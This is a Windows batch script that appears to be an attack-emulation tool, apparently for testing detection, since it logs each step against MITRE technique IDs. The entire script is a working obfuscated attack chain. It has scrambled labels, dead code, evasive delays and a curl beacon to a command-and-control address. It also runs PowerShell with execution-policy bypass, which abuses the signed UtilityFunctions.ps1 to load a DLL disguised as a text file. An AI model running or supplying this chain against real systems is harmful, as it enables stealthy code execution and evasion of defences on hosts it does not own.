@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR constants (plain literals)
SET zpvmcp=%APPDATA%\8635\ffa02ffe
SET fgthmk=https://10.0.0.49
SET twsewq=https://10.0.0.49/stage/2/icon.png?8635-7
SET vmnkpl=ITZEL-S2BO
SET qplmkn=7
SET bvncdx=chr0me.txt
SET lkjhgt=8635

REM Log file path
SET logvar=%APPDATA%\!qplmkn!\macula-simulations.log

REM Delay: start with 30-60s
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: delay_start=30s>> "!logvar!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: delay_complete=45s>> "!logvar!" 2>nul

SET state=0
GOTO ghtyup

:polkmj
REM Dead code block 1
SET fake1=dead_value
GOTO END

:ghtyup
IF !state!==0 GOTO xcvbnm
IF !state!==17 GOTO qazwsx
IF !state!==25 GOTO edcrfv
IF !state!==42 GOTO tgbnhy
IF !state!==99 GOTO END

:mnbvcx
REM Dead code block 2
IF 1==1 (
    GOTO END
) ELSE (
    GOTO xcvbnm
)

:xcvbnm
REM C2 Heartbeat (non-obfuscated curl)
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o nul "!twsewq!"
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: heartbeat_complete=!ERRORLEVEL!>> "!logvar!" 2>nul

REM TTP logging for heartbeat
SET result=1
SET err_detail=
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: ttp_log_start=T1105>> "!logvar!" 2>nul
echo [!DATE!:!TIME!][!vmnkpl!]: !qplmkn!-!lkjhgt!-T1105|Ingress Tool Transfer=!result!:!err_detail!>> "!logvar!" 2>nul

SET state=17
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: state_change=0->17>> "!logvar!" 2>nul
GOTO ghtyup

:lkjhgf
REM Dead code block 3
SET fake2=another_dead
GOTO qweasd

:qazwsx
REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: delay_start=random>> "!logvar!" 2>nul
SET /A delay=!RANDOM! %% 15 + 5
timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: delay_complete=!delay!s>> "!logvar!" 2>nul

SET state=25
GOTO ghtyup

:poiuyt
REM Dead code block 4
EXIT /B 1

:edcrfv
REM Execute .NET DLL via UtilityFunctions.ps1
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: net_exec_start>> "!logvar!" 2>nul
SET lolbin=powershell.exe
SET args=-ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin '!zpvmcp!\!bvncdx!';[Program.Class]::Dale()"

!lolbin! !args!
SET exec_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: net_exec_complete=!exec_result!>> "!logvar!" 2>nul

REM TTP logging for T1218
IF !exec_result!==0 (
    SET result=1
    SET err_detail=
) ELSE (
    SET result=0
    SET err_detail=exec_error_!exec_result!
)
echo [!DATE!:!TIME!][!vmnkpl!]: !qplmkn!-!lkjhgt!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!logvar!" 2>nul

SET state=42
GOTO ghtyup

:qweasd
REM Dead code block 5
GOTO END

:tgbnhy
REM Final delay
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: delay_start=final>> "!logvar!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: delay_complete=10s>> "!logvar!" 2>nul
SET state=99
GOTO ghtyup

:END
echo [!DATE! !TIME!][DEBUG][!vmnkpl!]: script_exit=normal>> "!logvar!" 2>nul
EXIT /B 0